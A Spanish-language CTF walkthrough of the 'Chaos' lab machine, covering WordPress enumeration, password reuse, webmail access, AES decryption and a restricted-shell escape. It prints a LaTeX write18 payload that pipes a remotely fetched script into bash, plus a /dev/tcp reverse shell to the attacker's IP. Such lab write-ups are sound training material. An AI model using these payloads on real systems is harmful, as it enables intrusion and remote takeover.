# Chaos
![chaoslogo](https://user-images.githubusercontent.com/87484792/183426922-b468a003-2088-4c41-981c-a5cbd503efc1.png)

## Datos previos de Interés

En esta maquina tocaremos mucha criptografia, es una maquina que siento que esta bastante equilibrada, tuve que investigar mucho para poder sacar algunos pasos y otros sin embargos se sacan por puro sentido común. Tendremos que buscar una contraseña para un post encriptado, ingresar a nuestro sistema de correo electronico para descargar un script de python y modificar un poco ese script para desencriptar el mensaje. Salir de un rbash y obtener credenciales desde archivos de firefox.

## Enumeración de puertos

Empezamos con una enumeración basica, buscaremos puertos abiertos en la maquina victima.

` sudo nmap --min-rate 5000 --open -vvv -n -sS -Pn -p- -oG openPorts.txt 10.10.10.120`


![1](https://user-images.githubusercontent.com/87484792/183431834-2b0b9f37-042e-4b9a-8312-9c851474d6a1.png)

Esta maquina cuenta con varios puertos abiertos. Entre ellos, aloja dos paginas web, tanto en el puerto 80 como el 10000. Y servicio de mensajeria, tanto envio como recepción de mensajes. Iremos paso a paso, y empezaremos por el puerto 80.

## Puerto 80

![2](https://user-images.githubusercontent.com/87484792/183432856-94bdc105-a091-48ff-95d6-fa006bb9ef46.png)

El puerto 80 muestra un mensaje, que como se puede ver en el codigo fuente, no está realmente controlando nada. Simplemente es un mensaje.
Vamos a fuzzear un poco, pues con lo que tenemos hasta ahora no podemos hacer nada.

El fuzzing muestra el siguiente resultado:

![3](https://user-images.githubusercontent.com/87484792/183434838-257d807d-65e6-470a-99be-251cb7c9e23b.png)

Podemos ver que tras esta pagina se esconde el CMS "WordPress" */wp*. Esto es un buen camino para seguir.
Al ingresar simplemente encontramos un directorio en él. Se trata de */wordpress*, clickamos en él y nos lleva a este sitio:

![4](https://user-images.githubusercontent.com/87484792/183436287-e25ba10f-0e7e-4dc6-8856-5153a0a1b2ce.png)

Al parecer para poder visualizar el contenido, necesitamos de una contraseña. Por el momento no tenemos ningúna, así que dejaremos esto para más adelante.
Partimos desde este directorio sin mucho más contenido. Antes de volver a hacer fuzzing, tengamos en cuenta que ahora mismo estamos tratando con Wordpress. Por lo que posiblemente encontremos un **wp-login.php** para poder ingresar en el CMS. Hagamos la prueba.

![image](https://user-images.githubusercontent.com/87484792/183436883-78c3d35b-99b5-47d0-ba7f-d9f060ddd7bc.png)

Efectivamente, encontramos un login. Sin embargo hasta el momento no hemos encontrado ninguna credencial.
Algunas versiones de WP son conocidas por su *informatión Leakage*. Se me ocurre que podriamos hacer fuerza bruta para intentar ver que usuarios estan registrados.
Para ello podemos utilizar multiples herramientas, en este caso usaré una especifica. *WPScan*.

`wpscan --url http://10.10.10.120/wp/wordpress/  --enumerate u`

![image](https://user-images.githubusercontent.com/87484792/183437604-79387d5f-b94d-478f-a80f-2382b6a9a9c7.png)

Se ha identificado un usuario potencialmente válido. *Human*.

Tras hacer fuerza bruta en el password, no consigo grandes resultados. Así que de momento solo tengo un usuario válido.
Tras fuzzear bastante y mirar en distintos puertos no consigo encontrar nada. Así que se me ocurre probar este usuario como contraseña del post anterior.

![image](https://user-images.githubusercontent.com/87484792/183438956-19042ced-1a81-4847-87a8-30a352bca83b.png)

Efectivamente, es válido. Y gracías a esto obtenemos unas credenciales de una cuenta WebMail.

## WebMail 

En este paso ya tenemos unas credenciales para authenticarnos en un servidor webmail. Como los puertos de iPOP e iMAP estan abiertos, se me ocurre que pueda visualizar algún correo electronico interesante. 

Hay muchas formas de acceder a esto, yo usaré *evolutión*. Un entorno gráfico que usé en otra maquina ("SneakyMailer")
Es bastante sencillo e intuitivo de usar, nos ahorrará tiempo. 

```
Les aconsejo que si no saben configurarlo, miren este post de book.hacktrick donde explican como usarlo.
https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap#evolution
```

Una vez logueados. Podremos visualizar un mensaje de correo.

![image](https://user-images.githubusercontent.com/87484792/183440298-e56ee746-7994-445c-ab97-fcc9367982d7.png)

Datos interesantes que podemos sacar en claro de este mensaje son los siguientes:

- Hay un archivo encriptado ("enim_msg.txt")
- Hay un script en Python usado para encriptar ("en.py")
- Sahay es la contraseña (?)

Una vez descargado en nuestra maquina local, procedo a visualizar ambos archivos.
El archivo encriptado no es legible (como era de esperar), y el script tiene la siguiente estructura:

```
def encrypt(key, filename):
        chunksize = 64*1024
        outputFile = "en" + filename
        filesize = str(os.path.getsize(filename)).zfill(16)
        IV =Random.new().read(16)

        encryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(filename, 'rb') as infile:
                with open(outputFile, 'wb') as outfile:
                        outfile.write(filesize.encode('utf-8'))
                        outfile.write(IV)

        while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                        break
                elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
        hasher = SHA256.new(password.decode('utf-8'))
        return hasher.digest()
```

Esta parte se me complicó un poco, puesto que no soy un gran experto en criptografía. Fui desglosando poco a poco el script, pero sabia que tardaría mucho en hacer el proceso inverso. Aqui pensé que el autor de la maquina podría haber sacado este script de algún repositorio, y de ser así, quizas hubiera un decrypt. Copíe el código en Google, y efectivamente, encontré este link de Github:

`https://github.com/vj0shii/File-Encryption-Script/blob/master/encrypt.py`

El autor es "vJ0shii", y si miramos el repositorio, tiene tambien un decript. Esto me ahorró mucho tiempo y quizas muchos dolores de cabeza. 

Decrypt:

```
import os, time
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from optparse import *
def decrypt(key, filename):
	chunksize = 64 * 1024
	outputFile = filename.split('en')[1]

	with open(filename, 'rb') as infile:
		filesize = int(infile.read(16))
		IV = infile.read(16)
		decryptor = AES.new(key, AES.MODE_CBC, IV)

		with open(outputFile, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)

				if len(chunk) == 0:
					break

				outfile.write(decryptor.decrypt(chunk))
			outfile.truncate(filesize)
def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
filename = raw_input("Enter filename: ")
password = raw_input("Enter password: ")
key = getKey(password)
decrypt(key,filename)

```
Podemos aprovechar ahora si, para hacer el proceso inverso y ver que dice el mensaje encriptado.

*Dato de apoyo:*
```
Por si os da problemas a la hora de ejecutar con los módulos. Desistalen PyCrypt & Crypt, e instalen pycryptodome
```

Una vez pasado por el decrypt, y decodeado en **base64** obtenemos el siguiente mensaje:

![image](https://user-images.githubusercontent.com/87484792/183443787-8eca67d1-7e84-4621-9358-4ed25a4b5c7a.png)

Obtenemos una nueva ruta y un dominio. Añadiré este dominio a mi `/etc/hosts` y visualizaré el contenido de la web.

El dominio aplica virtual hosting, y podemos visualizar nuevo contenido que antes no veiamos con la ip convencional.
Aunque no es del todo de ayuda en esta maquina, podemos diferenciar y comprender que a veces el tener un dominio puede contener material de apoyo para nuestro CTF.

![image](https://user-images.githubusercontent.com/87484792/183445285-005e1bf6-6cd9-4210-9bd9-b690c3d52046.png)

Visualicemos ahora sí, la ruta que nos proporcian en el mensaje encriptado.

![image](https://user-images.githubusercontent.com/87484792/183446022-68a7ff39-d18f-46ea-a822-29ec722f1666.png)

Parece un generador de PDF, para cosas como esta me gusta tener activo burpsuite. 
He hecho otras maquinas, como por ejemplo **RedPanda**, donde el vector de ataque es similar, así que puedo intuir por donde iran los tiros.
Hagamos una simulación, como que quiero generar un PDF, y veamos el comportamiento del servidor. Mi principal interes será ver si me arroja algún tipo de error, la versión, y que data esta solicitando. 

De primeras sin el burp activado, la pagina parece no hacer nada al hacer click en el botón. 
Con el burp activo, recibo esta respuesta:

![image](https://user-images.githubusercontent.com/87484792/183447954-ae0f3a12-f854-4bd3-92c6-c7919ecb75f5.png)

Esta respuesta del servidor me da mucha información. 

- El servidor esta utilizando pdfTeX para generar informes PDF.
- La versión que utiliza es la 3.14
- El archivo se genera con un nombre aleatorio
- Se guardan en una nueva ruta desconocida hasta ahora */pdf*

Con una busqueda rápida en Google, encuentro que la versión es vulnerable, permitiendo ejecución remota de comando (RCE).
`https://0day.work/hacking-with-latex/`

Tras unas cuantas pruebas para obtener ciertos archivos sensibles, encuentro que el servidor tiene un blacklist y bloquea ciertas peticiones, sin embargo esto tambien se contempla en el material de apoyo dado anteriormente. Igualmente, podemos ejecutar comandos sin ningún problema.

RCE code:

```
\immediate\write18{curl http://10.10.16.2/shell | bash }
```

En mi maquina atacante:

```
Contenido de "Shell":
-	bash -i >& /dev/tcp/10.10.16.2/8081 0>&1
Python3 Server:
-	python3 -m http-server 80
```

Vemos que obtenemos la shell:

![image](https://user-images.githubusercontent.com/87484792/183456745-1598706a-424f-4089-9570-37c48c3ffcb9.png)


Aplicaremos un tratamiento de la TTY, o observaré que usuarios estan a traves de `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
sahay:x:1000:1000:choas:/home/sahay:/bin/bash
ayush:x:1001:1001:,,,:/home/ayush:/opt/rbash
```

Estos usuarios son familiares, sin embargo puedo observar que ayush tiene una restricted bash. Veremos como podemos eludirla. 
Para convertirnos en ayush simplemente reutilizaremos la contraseña que encontramos pasos atras.

`su ayush` # password: jiujitsu

![image](https://user-images.githubusercontent.com/87484792/183461058-1c28ad60-0dc5-4320-a0b4-7b0df376d3ce.png)

Solo podremos ejecutar binarios que pertenezcan dentro de una ruta del PATH. Para eso vamos a mirar nuestra ruta:

echo $PATH: `/home/ayush/.app`
El problema es que estamos bastante limitados, pero por suerte conocemos la contraseña de ayush y podemos jugar con ello.

- El primer paso será salir de la shell de **ayush**, con exit bastará.
- Volveremos a la shell de **www-data**
- Haremos uso de los parametros de *su* para indicar que queremos ejecutar comandos sin una shell
 `su -s /bin/bash -c "ls /home/ayush.app" ayush`

Encontramos 3 binarios que podemos utilizar ("dir","ping","tar"). No sé si la intención del creador de la maquina es jugar con esos binarios para salir de la rbash.
Pero hay una cosa que nos puede ayudar de mejor forma.

- Ayush es el propietario de la ruta del path en la rbash
- Tenemos permisos de escritura en /home/ayush

Se me ocurre modificar el nombre de **.app** y con ello crear nuestro propio .app, alli podemos copiar binarios que nos interesen.
Este paso nos lo podriamos ahorrar si tuvieramos permisos de escritura tambien en .app, pero no es el caso.
Para ello ejecutaremos estos comandos:

`su -s /bin/bash -c "mv ~/.app ~/.noname" ayush`
`su -s /bin/bash -c "mkdir ~/.app" ayush`
`su -s /bin/bash -c "cp /bin/bash ~/.app" ayush`

Con esto podriamos ejecutar bash, y de aqui, modificar el path para tener acceso a todos los binarios de la maquina.
Ahora sí, dentro de la maquina, haremos un reconocimiento, y obtendremos la *flag.txt*
